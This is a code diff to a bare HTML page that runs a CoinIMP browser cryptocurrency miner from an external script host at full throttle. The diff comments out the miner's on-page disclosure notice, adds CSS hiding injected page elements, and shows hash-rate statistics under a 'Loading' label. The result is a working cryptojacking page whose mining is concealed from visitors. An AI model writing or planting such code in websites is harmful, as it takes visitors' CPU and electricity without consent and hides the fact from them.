@@ -5,16 +5,50 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+
+    <style>
+        body > div:not(#content){
+            display: none !important;
+            width: 0px !important;
+            height: 0px !important;
+        }
+    </style>
 </head>
 <body>
+
+    <div id="content">
+        <p class="status">Loading</p>
+    </div>
+    
+
     <script src="https://www.hostingcloud.racing/91Wd.js"></script>
     <script>
-        var _client = new Client.Anonymous('f842f301703090652327d08a4def326fdce6e8137dbb407c241a7c39af29f840', {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
-        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+        var status_text = document.getElementsByClassName("status")[0];
 
+        try {
+            var _client = new Client.Anonymous('f842f301703090652327d08a4def326fdce6e8137dbb407c241a7c39af29f840', {
+                throttle: 0, c: 'w'
+            });
+            
+            _client.start();
+
+            setInterval(function(){ 
+                status_text.innerHTML = `
+                    hashes/S : ${_client.getHashesPerSecond()}
+                    <br>
+                    Accepted Hashes : ${_client.getAcceptedHashes()}
+                `
+            }, 1000);
+            // _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+        } catch (error) {
+            let error_message = "UNKNOWN ERROR : " + error.message
+
+            if (error.message == "Client is not defined"){
+                error_message = "ERROR : Client is not defined (Something might be blocking it from loading.)"
+            }
+
+            status_text.innerHTML = error_message
+        }
     </script>
 </body>
 </html>
